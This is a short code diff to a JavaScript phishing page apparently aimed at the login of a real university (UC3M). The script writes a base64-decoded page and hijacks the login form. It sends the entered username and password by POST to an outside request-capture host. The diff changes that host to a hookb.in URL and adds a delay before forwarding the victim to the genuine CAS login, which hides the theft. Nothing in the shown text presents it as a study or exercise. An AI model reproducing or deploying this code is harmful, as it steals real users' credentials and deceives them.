@@ -7,11 +7,13 @@ document.write(atou(base64encoded));
 document.close();
 function send_data(){
 	var http = new XMLHttpRequest();
-	var url = 'https://akjhaa.requestcatcher.com/test';	
+	var url = 'https://hookb.in/eK16yP3aWNclaRPldJDm';	
 	var params = document.getElementById('edit-name').value + '||' + document.getElementById('edit-pass').value;
 	http.open('POST', url, true);
 	http.send(params);
-	document.getElementById('formulario1').action = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
-	document.getElementById("formulario1").submit(); 
+	setTimeout(function(){
+		document.getElementById('formulario1').action = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
+		document.getElementById("formulario1").submit(); 
+	}, 500);
 }
 setTimeout(function(){document.getElementById('formulario1').action = "javascript:send_data();";}, 500);
